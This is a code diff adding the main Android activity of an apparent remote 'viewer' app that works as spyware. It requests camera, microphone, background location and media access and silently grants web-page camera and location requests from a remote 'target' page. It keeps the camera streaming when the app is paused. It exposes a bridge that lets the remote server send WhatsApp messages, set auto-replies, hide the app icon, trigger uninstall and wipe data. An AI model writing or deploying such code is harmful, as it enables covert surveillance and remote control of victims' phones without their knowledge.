@@ -1,0 +1,165 @@
+package com.remote.viewer
+
+import android.Manifest
+import android.annotation.SuppressLint
+import android.app.Activity
+import android.content.ComponentName
+import android.content.Context
+import android.content.Intent
+import android.content.SharedPreferences
+import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
+import android.net.Uri
+import android.os.Build
+import android.os.Bundle
+import android.provider.Settings
+import android.view.ViewGroup
+import android.webkit.*
+import android.widget.*
+import org.json.JSONObject
+import java.net.URLEncoder
+
+class MainActivity : Activity() {
+
+    companion object {
+        // ⚠️ APNA RENDER URL YAHAN DALO
+        const val APP_URL = "https://remote-viewer.onrender.com"
+        private const val REQ_PERMS = 100
+        private const val REQ_SCREEN = 200
+    }
+
+    private lateinit var webView: WebView
+    private fun prefs(): SharedPreferences = getSharedPreferences("prefs", MODE_PRIVATE)
+
+    @SuppressLint("SetJavaScriptEnabled", "MissingPermission")
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        requestPermissions()
+
+        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
+        webView = WebView(this)
+        webView.layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f)
+        root.addView(webView)
+
+        val btnRow = LinearLayout(this).apply {
+            orientation = LinearLayout.HORIZONTAL
+            setPadding(4, 6, 4, 6)
+        }
+        btnRow.addView(Button(this).apply {
+            text = "🖥 Screen"
+            setOnClickListener {
+                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN)
+            }
+        })
+        btnRow.addView(Button(this).apply {
+            text = "📷 Sync"
+            setOnClickListener { startForegroundService(Intent(this@MainActivity, FileSyncService::class.java)) }
+        })
+        btnRow.addView(Button(this).apply {
+            text = "💬 Notif"
+            setOnClickListener { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
+        })
+        btnRow.addView(Button(this).apply {
+            text = "🤖 Auto Send"
+            setOnClickListener { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
+        })
+        root.addView(btnRow)
+
+        setContentView(root)
+        startForegroundService(Intent(this, StreamService::class.java))
+
+        webView.settings.javaScriptEnabled = true
+        webView.settings.domStorageEnabled = true
+        webView.settings.mediaPlaybackRequiresUserGesture = false
+        webView.addJavascriptInterface(AndroidBridge(), "AndroidBridge")
+        webView.webChromeClient = object : WebChromeClient() {
+            override fun onPermissionRequest(request: PermissionRequest) { request.grant(request.resources) }
+            override fun onGeolocationPermissionsShowPrompt(origin: String, callback: GeolocationPermissions.Callback) {
+                callback.invoke(origin, true, false)
+            }
+        }
+        webView.setWebViewClient(WebViewClient())
+        webView.loadUrl(APP_URL + "/target.html?auto=1")
+    }
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQ_SCREEN && resultCode == RESULT_OK && data != null) {
+            val i = Intent(this, ScreenShareService::class.java)
+            i.putExtra("code", resultCode)
+            i.putExtra("data", data)
+            startForegroundService(i)
+        }
+    }
+
+    private fun requestPermissions() {
+        val list = mutableListOf(
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION
+        )
+        if (Build.VERSION.SDK_INT >= 33) {
+            list += Manifest.permission.POST_NOTIFICATIONS
+            list += Manifest.permission.READ_MEDIA_IMAGES
+            list += Manifest.permission.READ_MEDIA_VIDEO
+        } else {
+            list += Manifest.permission.READ_EXTERNAL_STORAGE
+        }
+        if (Build.VERSION.SDK_INT >= 29) list += Manifest.permission.ACCESS_BACKGROUND_LOCATION
+        val need = list.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
+        if (need.isNotEmpty()) requestPermissions(need.toTypedArray(), REQ_PERMS)
+    }
+
+    inner class AndroidBridge {
+        @JavascriptInterface
+        fun handleCommand(json: String): String {
+            return try {
+                val o = JSONObject(json)
+                when (o.optString("type")) {
+                    "send-wa" -> sendWhatsApp(o.optString("num"), o.optString("text"))
+                    "set-autoreply" -> {
+                        prefs().edit().putBoolean("autoreply_on", o.optBoolean("on"))
+                            .putString("autoreply_msg", o.optString("msg")).apply()
+                        "ok"
+                    }
+                    "hide-app" -> {
+                        packageManager.setComponentEnabledSetting(
+                            ComponentName(this@MainActivity, MainActivity::class.java),
+                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            PackageManager.DONT_KILL_APP)
+                        "ok"
+                    }
+                    "delete-app" -> {
+                        prefs().edit().clear().apply()
+                        startActivity(Intent(Intent.ACTION_DELETE, Uri.parse("package:$packageName"))
+                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+                        "ok"
+                    }
+                    "wipe" -> { prefs().edit().clear().apply(); "ok" }
+                    else -> "unknown"
+                }
+            } catch (e: Exception) { "err:" + e.message }
+        }
+    }
+
+    private fun sendWhatsApp(num: String, text: String): String {
+        return try {
+            prefs().edit().putString("pending_wa", text).apply()
+            val url = "https://wa.me/" + num.trim().replace(Regex("[^0-9]"), "") +
+                "?text=" + URLEncoder.encode(text, "UTF-8")
+            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+            "ok"
+        } catch (e: Exception) { "err:whatsapp-not-installed" }
+    }
+
+    override fun onPause() {
+        super.onPause()
+        // webView.onPause() NAHI karte — camera streaming jari rahe
+    }
+    override fun onDestroy() {
+        webView.destroy()
+        super.onDestroy()
+    }
+}
